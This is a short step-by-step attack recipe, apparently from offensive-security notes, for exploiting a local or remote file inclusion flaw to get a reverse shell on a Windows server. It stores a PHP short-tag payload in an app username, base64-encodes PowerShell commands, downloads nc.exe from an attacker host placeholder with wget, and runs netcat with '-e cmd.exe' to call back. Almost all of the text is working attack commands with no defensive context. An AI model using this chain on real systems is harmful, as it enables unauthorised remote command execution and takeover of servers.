### REQUIREMENTS: Confirm that the server is vulnerable to Remote File Inclusion/Local File Inclusion

### STEPS:

#### 1) Create a new user in the app inserting our encoded payload as the username value:

#### echo "wget http://ATTACK_IP/nc.exe -o C:\\Windows\\TEMP\\nc.exe" | iconv -t UTF-16LE | base64

#### 2) The final username value payload becomes: <?=`powershell /enc ENCODED_PAYLOAD`?>

#### 3) Abuse the LFI/RFI vulnerability to make the command execute on the server.

#### 4) Create another user with: echo "C:\Windows\TEMP\nc.exe -e cmd.exe IP_ADDRESS PORT" | iconv -t UTF-16LE | base64"

#### 5) Repeat steps to get your reverse shell.

### Similar approach can be used on a linux machine as well
